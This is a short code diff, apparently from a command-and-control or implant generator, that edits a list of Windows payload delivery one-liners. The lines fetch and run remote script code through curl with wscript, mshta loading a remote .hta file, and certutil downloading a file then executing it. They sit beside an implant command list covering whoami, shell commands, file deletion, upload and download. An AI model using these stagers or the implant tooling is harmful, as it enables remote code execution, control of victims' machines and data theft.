@@ -9,7 +9,7 @@ endpoint = digit_identifier()
 artifact = string_identifier()
 delivery = f'curl ~endpoint~ -o {artifact}.js && wscript /e:jscript {artifact}.js\n' \
            f'mshta ~endpoint~.hta\n' \
-           f'certutil -urlcache -split -f ~endpoint~ %TEMP%/{artifact}.js && wscript /e:jscript %TEMP%/{artifact}.js'
+           f'certutil -urlcache -split -f ~endpoint~ {artifact}.js && wscript /e:jscript {artifact}.js'
 commands = 'delay,dir,hostname,whoami,os,cmd,delfile,download,upload'
 
 
